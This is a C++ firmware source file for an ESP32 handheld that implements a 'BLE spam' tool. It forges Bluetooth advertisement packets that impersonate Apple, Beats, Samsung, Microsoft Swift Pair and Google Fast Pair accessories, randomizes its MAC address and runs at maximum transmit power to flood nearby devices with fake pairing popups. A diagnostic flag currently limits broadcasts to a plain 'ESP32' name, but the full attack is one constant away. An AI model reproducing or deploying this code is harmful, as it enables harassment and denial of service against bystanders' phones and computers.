#include "ble_spam.h"

#include <Arduino.h>
#include <BLEAdvertising.h>
#include <BLEDevice.h>
#include <U8g2lib.h>
#include <WiFi.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <string>
#include <string.h>

#include "app_config.h"
#include "ui_theme.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern bool runningApp;

#define BTN_UP   AppConfig::BTN_UP
#define BTN_DOWN AppConfig::BTN_DOWN
#define BTN_OK   AppConfig::BTN_OK
#define BTN_BACK AppConfig::BTN_BACK
#define BTN_AUX  AppConfig::BTN_AUX

enum SpamMode {
    SPAM_APPLE     = 0,
    SPAM_SAMSUNG   = 1,
    SPAM_MICROSOFT = 2,
    SPAM_GOOGLE    = 3,
    SPAM_CHAOS     = 4
};

static const char* MODE_NAMES[] = {
    "Apple (iOS popups)",
    "Samsung (Android)",
    "Microsoft Swift Pair",
    "Google Fast Pair",
    "CHAOS MODE (all)"
};
static const int MODE_COUNT = 5;

struct AppleModel {
    uint8_t product[2];
    const char* name;
};

static const AppleModel APPLE_MODELS[] = {
    {{0x0E, 0x20}, "AirPods Pro"},
    {{0x0A, 0x20}, "AirPods"},
    {{0x0B, 0x20}, "AirPods Max"},
    {{0x05, 0x20}, "AirPods 2nd gen"},
    {{0x13, 0x20}, "AirPods 3rd gen"},
    {{0x14, 0x20}, "AirPods Pro 2nd"},
    {{0x01, 0x20}, "AirPods 1st gen"},
    {{0x06, 0x20}, "Beats Solo 3"},
    {{0x09, 0x20}, "BeatsX"},
    {{0x0C, 0x20}, "Beats Flex"},
    {{0x11, 0x20}, "Beats Studio Pro"},
    {{0x16, 0x20}, "Powerbeats Pro"},
    {{0x17, 0x20}, "Beats Fit Pro"}
};
static const int APPLE_COUNT = sizeof(APPLE_MODELS) / sizeof(AppleModel);

struct SamsungModel {
    uint8_t id[2];
    const char* name;
};

static const SamsungModel SAMSUNG_MODELS[] = {
    {{0x83, 0xE0}, "Galaxy Buds Live"},
    {{0x80, 0xE0}, "Galaxy Buds+"},
    {{0x2C, 0xE1}, "Galaxy Buds 2"},
    {{0x40, 0xE1}, "Galaxy Buds 2 Pro"},
    {{0x05, 0xE1}, "Galaxy Buds Pro"},
    {{0x1F, 0xE0}, "Galaxy Buds"},
    {{0xA3, 0xE1}, "Galaxy Buds FE"}
};
static const int SAMSUNG_COUNT = sizeof(SAMSUNG_MODELS) / sizeof(SamsungModel);

static const char* MS_NAMES[] = {
    "Surface Keyboard",
    "Surface Mouse",
    "Surface Headphones",
    "Xbox Controller",
    "Surface Pen"
};
static const int MS_COUNT = sizeof(MS_NAMES) / sizeof(char*);

struct GoogleModel {
    uint8_t id[3];
    const char* name;
};

static const GoogleModel GOOGLE_MODELS[] = {
    {{0xCD, 0x82, 0x56}, "Pixel Buds"},
    {{0x00, 0x00, 0x47}, "Pixel Buds A"},
    {{0xF5, 0x2E, 0x41}, "Bose NC 700"},
    {{0x0E, 0x0B, 0x09}, "JBL Live 650"},
    {{0x14, 0x00, 0x45}, "Sony WH-1000XM4"},
    {{0x00, 0x00, 0x44}, "Nest Device"}
};
static const int GOOGLE_COUNT = sizeof(GOOGLE_MODELS) / sizeof(GoogleModel);

static volatile unsigned long packetsSent = 0;
static String currentDeviceName = "";
static SpamMode activeMode = SPAM_APPLE;
static constexpr bool BLE_SPAM_DIAG_ESP32_ONLY = true;

static bool pressed(uint8_t pin) {
    return digitalRead(pin) == LOW;
}

static void waitRelease(uint8_t pin) {
    while (digitalRead(pin) == LOW) delay(5);
    delay(80);
}

static void beep(uint16_t freq, uint16_t durationMs) {
    (void)freq;
    delay(durationMs);
}

static String fitOledText(String text, int maxPx) {
    u8g2.setFont(u8g2_font_5x7_tr);
    while (text.length() > 0 && u8g2.getStrWidth(text.c_str()) > maxPx) {
        text.remove(text.length() - 1);
    }
    if (text.length() > 2 && u8g2.getStrWidth(text.c_str()) > maxPx - 8) {
        text.remove(text.length() - 2);
        text += "..";
    }
    return text;
}

static void drawOledFooter(const char* hint) {
    u8g2.drawHLine(0, 55, AppConfig::SCREEN_W);
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(2, 63, hint);
}

static void drawOledRow(int y, bool selected, const String& title) {
    if (selected) {
        u8g2.drawBox(0, y - 7, AppConfig::SCREEN_W, 10);
        u8g2.setDrawColor(0);
    }
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(3, y, fitOledText(title, 122).c_str());
    if (selected) u8g2.setDrawColor(1);
}

static const char* modeShortName(SpamMode mode) {
    switch (mode) {
        case SPAM_APPLE:     return "APPLE";
        case SPAM_SAMSUNG:   return "SAMSUNG";
        case SPAM_MICROSOFT: return "MS";
        case SPAM_GOOGLE:    return "GOOGLE";
        case SPAM_CHAOS:     return "CHAOS";
        default:             return "BLE";
    }
}

static void randomizeMac() {
    esp_bd_addr_t mac;
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
    mac[0] |= 0xC0;
    esp_ble_gap_set_rand_addr(mac);
}

static void sendApplePacket(BLEAdvertising* adv) {
    int idx = random(0, APPLE_COUNT);
    const AppleModel& m = APPLE_MODELS[idx];
    currentDeviceName = String(m.name);

    uint8_t packet[31] = {
        0x1E, 0xFF,
        0x4C, 0x00,
        0x07, 0x19,
        0x01,
        m.product[0], m.product[1],
        0x55
    };
    for (int i = 10; i < 31; i++) packet[i] = (uint8_t)random(0, 256);

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

static void sendSamsungPacket(BLEAdvertising* adv) {
    int idx = random(0, SAMSUNG_COUNT);
    const SamsungModel& m = SAMSUNG_MODELS[idx];
    currentDeviceName = String(m.name);

    uint8_t packet[27] = {
        0x1B, 0xFF,
        0x75, 0x00,
        0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03,
        0x21, 0x01, 0x09,
        m.id[0], m.id[1],
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    };

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

static void sendMicrosoftPacket(BLEAdvertising* adv) {
    int idx = random(0, MS_COUNT);
    currentDeviceName = String(MS_NAMES[idx]);

    uint8_t nameLen = strlen(MS_NAMES[idx]);
    if (nameLen > 20) nameLen = 20;

    uint8_t packet[31];
    int p = 0;
    packet[p++] = 0x03;
    packet[p++] = 0x03;
    packet[p++] = 0x2C;
    packet[p++] = 0xFE;
    packet[p++] = 0x06 + nameLen;
    packet[p++] = 0xFF;
    packet[p++] = 0x06;
    packet[p++] = 0x00;
    packet[p++] = 0x03;
    packet[p++] = 0x00;
    packet[p++] = 0x80;
    memcpy(&packet[p], MS_NAMES[idx], nameLen);
    p += nameLen;

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, p));
    adv->setAdvertisementData(advData);
}

static void sendGooglePacket(BLEAdvertising* adv) {
    int idx = random(0, GOOGLE_COUNT);
    const GoogleModel& m = GOOGLE_MODELS[idx];
    currentDeviceName = String(m.name);

    uint8_t packet[14] = {
        0x02, 0x01, 0x06,
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE,
        m.id[0], m.id[1], m.id[2]
    };

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

static void sendEsp32NamePacket(BLEAdvertising* adv) {
    currentDeviceName = "ESP32";

    BLEAdvertisementData advData;
    advData.setFlags(0x06);
    advData.setName("ESP32");
    adv->setAdvertisementData(advData);

    BLEAdvertisementData scanData;
    scanData.setName("ESP32");
    adv->setScanResponse(true);
    adv->setScanResponseData(scanData);
}

static void sendSpamPacket(BLEAdvertising* adv, SpamMode mode) {
    if (BLE_SPAM_DIAG_ESP32_ONLY) {
        sendEsp32NamePacket(adv);
        return;
    }

    SpamMode effective = mode;
    if (mode == SPAM_CHAOS) {
        effective = (SpamMode)random(0, 4);
    }

    randomizeMac();

    switch (effective) {
        case SPAM_APPLE:     sendApplePacket(adv);     break;
        case SPAM_SAMSUNG:   sendSamsungPacket(adv);   break;
        case SPAM_MICROSOFT: sendMicrosoftPacket(adv); break;
        case SPAM_GOOGLE:    sendGooglePacket(adv);    break;
        default: break;
    }
}

static void resetWirelessForBleSpam() {
    WiFi.disconnect(true, true);
    WiFi.mode(WIFI_OFF);
    delay(120);

    BLEDevice::deinit(true);
    delay(180);
    btStop();
    delay(120);
    btStart();
    delay(180);
}

static bool showDisclaimer() {
    u8g2.clearBuffer();
    UiTheme::drawHeader(u8g2, "BLE SPAM", "AVISO");
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(4, 24, "Envia adverts BLE");
    u8g2.drawStr(4, 34, "falsos cercanos.");
    u8g2.drawStr(4, 45, "Uso responsable.");
    drawOledFooter("OK acepta  BACK sale");
    u8g2.sendBuffer();

    while (true) {
        if (pressed(BTN_OK)) {
            beep(2200, 60);
            waitRelease(BTN_OK);
            return true;
        }
        if (pressed(BTN_BACK)) {
            beep(1000, 80);
            waitRelease(BTN_BACK);
            return false;
        }
        delay(20);
    }
}

static void drawModeMenu(int cursor) {
    char status[8];
    snprintf(status, sizeof(status), "%d/%d", cursor + 1, MODE_COUNT);
    u8g2.clearBuffer();
    UiTheme::drawHeader(u8g2, "BLE SPAM", status);

    int first = cursor - 1;
    if (first < 0) first = 0;
    if (first > MODE_COUNT - 4) first = max(0, MODE_COUNT - 4);

    for (int i = 0; i < 4; i++) {
        int idx = first + i;
        if (idx >= MODE_COUNT) break;
        drawOledRow(24 + i * 10, idx == cursor, MODE_NAMES[idx]);
    }

    drawOledFooter("OK start  AUX chaos");
    u8g2.sendBuffer();
}

static int selectMode() {
    int cursor = 0;
    drawModeMenu(cursor);

    while (true) {
        if (pressed(BTN_UP)) {
            cursor = (cursor - 1 + MODE_COUNT) % MODE_COUNT;
            beep(2100, 20);
            drawModeMenu(cursor);
            delay(180);
        }
        if (pressed(BTN_DOWN)) {
            cursor = (cursor + 1) % MODE_COUNT;
            beep(2100, 20);
            drawModeMenu(cursor);
            delay(180);
        }
        if (pressed(BTN_BACK)) {
            beep(1000, 50);
            waitRelease(BTN_BACK);
            return -1;
        }
        if (pressed(BTN_AUX)) {
            beep(1600, 40);
            waitRelease(BTN_AUX);
            return SPAM_CHAOS;
        }
        if (pressed(BTN_OK)) {
            beep(1800, 50);
            waitRelease(BTN_OK);
            return cursor;
        }
        delay(20);
    }
}

static void drawAttackFrame(SpamMode mode) {
    u8g2.clearBuffer();
    UiTheme::drawHeader(u8g2, "BLE ACTIVE", modeShortName(mode));
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(4, 26, "Packets: 0");
    u8g2.drawStr(4, 37, "Current: ...");
    u8g2.drawStr(4, 48, "Rate: -- pkt/s");
    drawOledFooter("BACK/AUX stop");
    u8g2.sendBuffer();
}

static void drawAttackStats(unsigned long pkts, float rate) {
    u8g2.clearBuffer();
    UiTheme::drawHeader(u8g2, "BLE ACTIVE", modeShortName(activeMode));
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(4, 25, ("Packets: " + String(pkts)).c_str());
    u8g2.drawStr(4, 36, fitOledText("Now: " + currentDeviceName, 120).c_str());
    char rateBuf[22];
    snprintf(rateBuf, sizeof(rateBuf), "Rate: %d pkt/s", (int)rate);
    u8g2.drawStr(4, 47, rateBuf);
    u8g2.drawFrame(90, 50, 34, 5);
    u8g2.drawBox(92, 52, random(3, 29), 1);
    drawOledFooter("BACK/AUX stop");
    u8g2.sendBuffer();
}

void runBLESpam() {
    while (digitalRead(BTN_OK) == LOW ||
           digitalRead(BTN_BACK) == LOW ||
           digitalRead(BTN_AUX) == LOW) {
        delay(5);
    }
    delay(100);

    if (!showDisclaimer()) return;

    while (true) {
        int choice = selectMode();
        if (choice < 0) break;

        activeMode = (SpamMode)choice;

        resetWirelessForBleSpam();
        BLEDevice::init(BLE_SPAM_DIAG_ESP32_ONLY ? "ESP32" : "");
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
        BLEServer* server = BLEDevice::createServer();
        BLEAdvertising* adv = server->getAdvertising();

        adv->setMinInterval(0x20);
        adv->setMaxInterval(0x40);

        drawAttackFrame(activeMode);
        beep(2400, 40);
        delay(20);
        beep(3000, 60);

        packetsSent = 0;
        unsigned long lastStatsUpdate = millis();
        unsigned long lastPacket = 0;
        unsigned long lastPktCount = 0;
        float currentRate = 0;

        bool stopAttack = false;
        while (!stopAttack) {
            if (millis() - lastPacket > 20) {
                adv->stop();
                sendSpamPacket(adv, activeMode);
                adv->start();
                packetsSent++;
                lastPacket = millis();
            }

            if (millis() - lastStatsUpdate > 250) {
                unsigned long elapsed = millis() - lastStatsUpdate;
                unsigned long delta = packetsSent - lastPktCount;
                currentRate = (delta * 1000.0f) / elapsed;
                lastPktCount = packetsSent;
                drawAttackStats(packetsSent, currentRate);
                lastStatsUpdate = millis();
            }

            if (pressed(BTN_BACK) || pressed(BTN_AUX)) {
                stopAttack = true;
            }

            delay(5);
        }

        adv->stop();
        BLEDevice::deinit(false);

        beep(1800, 40);
        delay(20);
        beep(1200, 60);

        while (digitalRead(BTN_OK) == LOW ||
               digitalRead(BTN_BACK) == LOW ||
               digitalRead(BTN_AUX) == LOW) {
            delay(5);
        }
        delay(150);
    }
}

void bleSpamEnter() {
    runBLESpam();
    runningApp = false;
}

void bleSpamLoop() {
}

void bleSpamExit() {
    BLEDevice::deinit(false);
}
